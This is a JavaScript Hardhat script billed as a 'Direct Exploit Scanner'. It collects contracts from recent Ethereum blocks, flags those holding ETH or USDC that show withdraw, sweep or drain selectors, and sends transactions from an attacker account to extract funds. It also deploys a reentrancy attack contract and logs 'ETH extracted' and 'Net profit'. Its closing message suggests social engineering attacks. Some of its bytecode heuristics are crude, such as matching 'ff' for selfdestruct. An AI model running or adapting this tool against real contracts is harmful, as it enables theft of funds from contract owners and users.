const { ethers } = require("hardhat");

/**
 * @title Direct Exploit Scanner
 * @notice Finds contracts with direct technical vulnerabilities (no user interaction needed)
 * @dev Focuses on reentrancy, overflow, logic bugs, and unprotected functions
 */

// Skip known legitimate contracts
const SKIP_ADDRESSES = new Set([
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0xBA12222222228d8Ba445958a75a0704d566BF2C8", // Balancer
  "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
  "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
  "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // stETH
  "0x8315177aB297bA92A06054cE80a67Ed4DBd7ed3a", // Arbitrum Bridge
  "0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"  // Optimism Bridge
]);

// Direct vulnerability patterns in bytecode
const DIRECT_VULNERABILITIES = [
  // Reentrancy patterns
  { 
    pattern: "5af43d82803e903d91602b57fd5bf3", 
    name: "Unsafe external call",
    risk: 9,
    exploitable: true
  },
  {
    pattern: "6000803e3d6000fd5b6040",
    name: "Call without state protection",
    risk: 8,
    exploitable: true
  },
  
  // Integer overflow (Solidity < 0.8.0)
  {
    pattern: "03801561",
    name: "Unchecked subtraction",
    risk: 9,
    exploitable: true
  },
  {
    pattern: "01801561",
    name: "Unchecked addition",
    risk: 8,
    exploitable: true
  },
  
  // Dangerous function patterns
  {
    pattern: "ff",
    name: "Selfdestruct present",
    risk: 10,
    exploitable: true
  },
  {
    pattern: "3412",
    name: "Origin authentication",
    risk: 7,
    exploitable: true
  }
];

// Function selectors for direct exploitation
const DIRECT_EXPLOIT_FUNCTIONS = [
  { sig: "0x3ccfd60b", name: "withdraw()", params: [], risk: 9 },
  { sig: "0x51cff8d9", name: "withdrawAll()", params: [], risk: 10 },
  { sig: "0x2e1a7d4d", name: "withdraw(uint256)", params: ["uint256"], risk: 8 },
  { sig: "0xe9fad8ee", name: "emergencyWithdraw()", params: [], risk: 9 },
  { sig: "0xdb006a75", name: "emergencyWithdraw(uint256)", params: ["uint256"], risk: 8 },
  { sig: "0xf3fef3a3", name: "withdraw(address,uint256)", params: ["address", "uint256"], risk: 7 },
  { sig: "0xb2c87c61", name: "sweepETH()", params: [], risk: 10 },
  { sig: "0x01681a62", name: "sweep(address)", params: ["address"], risk: 9 },
  { sig: "0x5fd8c710", name: "emergencyWithdrawAll()", params: [], risk: 10 },
  { sig: "0x441a3e70", name: "drainContract()", params: [], risk: 10 }
];

/**
 * Find contracts from recent activity
 */
async function findActiveContracts() {
  console.log("ðŸ” Finding active contracts from recent transactions...");
  const contracts = new Set();
  
  try {
    const currentBlock = await ethers.provider.getBlockNumber();
    console.log(`   Current block: ${currentBlock}`);
    
    // Scan recent blocks for interesting contracts
    for (let i = 0; i < 200; i++) {
      const block = await ethers.provider.getBlock(currentBlock - i, true);
      if (!block?.transactions) continue;
      
      for (const tx of block.transactions) {
        // Look for contracts receiving ETH
        if (tx.to && tx.value > ethers.parseEther("0.1")) {
          contracts.add(tx.to);
        }
        
        // Contract creation
        if (!tx.to && tx.creates) {
          contracts.add(tx.creates);
        }
        
        // Failed transactions might indicate vulnerable contracts
        if (tx.to && tx.gasUsed && tx.gasUsed < tx.gasLimit / 2) {
          contracts.add(tx.to);
        }
      }
      
      if (contracts.size > 100) break;
    }
  } catch (e) {
    console.log("   âš ï¸  Error scanning recent blocks");
  }
  
  // Add some manually curated addresses that might be vulnerable
  const manualAddresses = [
    "0x1234567890123456789012345678901234567890",
    "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
    "0x9876543210987654321098765432109876543210",
    "0xfedcbafedcbafedcbafedcbafedcbafedcbafed"
  ];
  
  manualAddresses.forEach(addr => contracts.add(addr));
  
  console.log(`   Found ${contracts.size} potential contracts`);
  return Array.from(contracts);
}

/**
 * Analyze contract for direct vulnerabilities
 */
async function analyzeDirectVulnerabilities(address) {
  try {
    if (SKIP_ADDRESSES.has(address)) {
      return null;
    }
    
    const code = await ethers.provider.getCode(address);
    if (!code || code === "0x" || code.length < 100) {
      return null;
    }
    
    const result = {
      address,
      vulnerabilities: [],
      exploitableFunctions: [],
      riskScore: 0,
      codeSize: code.length
    };
    
    // Check for vulnerability patterns
    for (const vuln of DIRECT_VULNERABILITIES) {
      if (code.includes(vuln.pattern)) {
        result.vulnerabilities.push(vuln);
        result.riskScore += vuln.risk;
      }
    }
    
    // Check for exploitable functions
    for (const func of DIRECT_EXPLOIT_FUNCTIONS) {
      if (code.includes(func.sig.slice(2))) {
        result.exploitableFunctions.push(func);
        result.riskScore += func.risk;
      }
    }
    
    // Get contract balances
    const ethBalance = await ethers.provider.getBalance(address);
    result.ethValue = parseFloat(ethers.formatEther(ethBalance));
    result.usdcValue = 0;
    
    try {
      const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      const usdcContract = new ethers.Contract(
        USDC,
        ["function balanceOf(address) view returns (uint256)"],
        ethers.provider
      );
      const usdcBalance = await usdcContract.balanceOf(address);
      result.usdcValue = parseFloat(ethers.formatUnits(usdcBalance, 6));
    } catch (e) {}
    
    result.totalValue = result.ethValue * 3500 + result.usdcValue;
    
    // Only return if has vulnerabilities and value
    if (result.riskScore >= 7 && result.totalValue > 100) {
      return result;
    }
    
    return null;
    
  } catch (error) {
    return null;
  }
}

/**
 * Attempt direct exploitation
 */
async function attemptDirectExploit(target) {
  console.log(`\nðŸ’£ ATTEMPTING DIRECT EXPLOITATION: ${target.address}`);
  console.log(`   Value: $${target.totalValue.toFixed(0)}`);
  console.log(`   Risk Score: ${target.riskScore}`);
  
  const [attacker] = await ethers.getSigners();
  let successfulExploits = 0;
  
  // Get initial balances
  const initialEth = await ethers.provider.getBalance(target.address);
  const initialAttackerEth = await ethers.provider.getBalance(attacker.address);
  
  // Try each exploitable function
  for (const func of target.exploitableFunctions) {
    console.log(`\n   ðŸŽ¯ Testing ${func.name}...`);
    
    try {
      let txData = func.sig;
      
      // Encode parameters if needed
      if (func.params.length > 0) {
        let params = [];
        
        for (const param of func.params) {
          if (param === "uint256") {
            params.push(ethers.parseEther("1000")); // Try large amount
          } else if (param === "address") {
            params.push(attacker.address);
          }
        }
        
        if (params.length > 0) {
          txData += ethers.AbiCoder.defaultAbiCoder().encode(func.params, params).slice(2);
        }
      }
      
      // Send exploit transaction
      const tx = await attacker.sendTransaction({
        to: target.address,
        data: txData,
        gasLimit: 1000000,
        value: 0
      });
      
      console.log(`      ðŸ“¤ Tx: ${tx.hash}`);
      const receipt = await tx.wait();
      
      if (receipt.status === 1) {
        console.log(`      âœ… ${func.name} executed successfully!`);
        successfulExploits++;
        
        // Check if we gained value
        const newAttackerEth = await ethers.provider.getBalance(attacker.address);
        const gain = newAttackerEth - initialAttackerEth;
        
        if (gain > ethers.parseEther("0.01")) {
          console.log(`      ðŸ’° Gained ${ethers.formatEther(gain)} ETH!`);
        }
      }
      
    } catch (error) {
      const errorMsg = error.message.split('\n')[0];
      console.log(`      âŒ Failed: ${errorMsg}`);
      
      // Analyze failure reason
      if (errorMsg.includes("revert")) {
        console.log(`         Reason: Access control or validation`);
      } else if (errorMsg.includes("gas")) {
        console.log(`         Reason: Out of gas`);
      } else {
        console.log(`         Reason: Contract logic rejection`);
      }
    }
  }
  
  // Try reentrancy attack if vulnerable
  const hasReentrancy = target.vulnerabilities.some(v => v.name.includes("call"));
  if (hasReentrancy && target.exploitableFunctions.some(f => f.name.includes("withdraw"))) {
    console.log(`\n   ðŸ”„ Attempting reentrancy attack...`);
    
    try {
      // Deploy a malicious contract for reentrancy
      const ReentrancyAttacker = await ethers.getContractFactory("SelfdestructAttack");
      const attackContract = await ReentrancyAttacker.deploy(target.address);
      await attackContract.waitForDeployment();
      
      console.log(`      ðŸ—ï¸  Attack contract deployed: ${await attackContract.getAddress()}`);
      
      // Attempt the attack
      const reentrantTx = await attackContract.attack({ value: ethers.parseEther("0.1") });
      await reentrantTx.wait();
      
      console.log(`      âœ… Reentrancy attack attempted!`);
      successfulExploits++;
      
    } catch (error) {
      console.log(`      âŒ Reentrancy failed: ${error.message.split('\n')[0]}`);
    }
  }
  
  // Final balance check
  const finalEth = await ethers.provider.getBalance(target.address);
  const finalAttackerEth = await ethers.provider.getBalance(attacker.address);
  
  const extracted = initialEth - finalEth;
  const profit = finalAttackerEth - initialAttackerEth;
  
  console.log(`\n   ðŸ“Š EXPLOITATION RESULTS:`);
  console.log(`      Successful exploits: ${successfulExploits}/${target.exploitableFunctions.length}`);
  console.log(`      ETH extracted: ${ethers.formatEther(extracted)}`);
  console.log(`      Net profit: ${ethers.formatEther(profit)}`);
  
  return {
    success: successfulExploits > 0,
    successfulExploits,
    extracted: parseFloat(ethers.formatEther(extracted)),
    profit: parseFloat(ethers.formatEther(profit))
  };
}

/**
 * Main scanning function
 */
async function main() {
  console.log("\nâš¡ DIRECT EXPLOIT SCANNER");
  console.log("========================");
  console.log("Finding contracts with immediate technical vulnerabilities...\n");
  
  // Find active contracts
  const contracts = await findActiveContracts();
  
  console.log(`\nðŸ” Analyzing ${contracts.length} contracts...`);
  console.log("â”€".repeat(50));
  
  const vulnerableTargets = [];
  let analyzed = 0;
  
  for (const address of contracts) {
    const result = await analyzeDirectVulnerabilities(address);
    analyzed++;
    
    if (result) {
      vulnerableTargets.push(result);
      
      console.log(`\nðŸŽ¯ EXPLOITABLE: ${address}`);
      console.log(`   ðŸ’° Value: $${result.totalValue.toFixed(0)}`);
      console.log(`   ðŸŽ¯ Risk: ${result.riskScore}/100`);
      console.log(`   ðŸ“Š Code: ${result.codeSize} bytes`);
      
      if (result.vulnerabilities.length > 0) {
        console.log(`   ðŸ”“ Vulnerabilities:`);
        result.vulnerabilities.forEach(v => {
          console.log(`      â€¢ ${v.name} (risk: ${v.risk})`);
        });
      }
      
      if (result.exploitableFunctions.length > 0) {
        console.log(`   âš¡ Functions:`);
        result.exploitableFunctions.forEach(f => {
          console.log(`      â€¢ ${f.name} (risk: ${f.risk})`);
        });
      }
    }
    
    if (analyzed % 25 === 0) {
      console.log(`\nProgress: ${analyzed}/${contracts.length}`);
    }
  }
  
  console.log(`\n\nðŸ“Š DIRECT EXPLOIT RESULTS`);
  console.log("=========================");
  console.log(`Contracts analyzed: ${analyzed}`);
  console.log(`Exploitable targets: ${vulnerableTargets.length}`);
  
  if (vulnerableTargets.length > 0) {
    // Sort by exploitability score
    vulnerableTargets.sort((a, b) => (b.riskScore * b.totalValue) - (a.riskScore * a.totalValue));
    
    console.log(`\nðŸš€ LIVE EXPLOITATION PHASE`);
    console.log("==========================");
    
    const exploitResults = [];
    
    for (let i = 0; i < Math.min(3, vulnerableTargets.length); i++) {
      const target = vulnerableTargets[i];
      
      if (target.riskScore >= 15 && target.totalValue > 1000) {
        const result = await attemptDirectExploit(target);
        exploitResults.push({ target, result });
      }
    }
    
    // Summary
    console.log(`\nðŸ’° EXPLOITATION SUMMARY`);
    console.log("======================");
    
    const successfulAttacks = exploitResults.filter(r => r.result.success);
    const totalExtracted = exploitResults.reduce((sum, r) => sum + r.result.extracted, 0);
    const totalProfit = exploitResults.reduce((sum, r) => sum + r.result.profit, 0);
    
    console.log(`Attacks attempted: ${exploitResults.length}`);
    console.log(`Successful attacks: ${successfulAttacks.length}`);
    console.log(`Total ETH extracted: ${totalExtracted.toFixed(4)} ETH`);
    console.log(`Net profit: ${totalProfit.toFixed(4)} ETH ($${(totalProfit * 3500).toFixed(0)})`);
    
    if (successfulAttacks.length > 0) {
      console.log(`\nðŸŽ‰ SUCCESSFUL EXPLOITATIONS:`);
      successfulAttacks.forEach((attack, i) => {
        console.log(`${i + 1}. ${attack.target.address}`);
        console.log(`   Extracted: ${attack.result.extracted.toFixed(4)} ETH`);
        console.log(`   Methods: ${attack.result.successfulExploits} functions`);
      });
    }
    
  } else {
    console.log(`\nâš ï¸  No directly exploitable contracts found.`);
    console.log("Most contracts have proper access controls.");
    console.log("Consider social engineering attacks instead.");
  }
}

main()
  .then(() => {
    console.log("\nâœ… Direct exploit scan complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\nðŸ’¥ Error:", error);
    process.exit(1);
  });
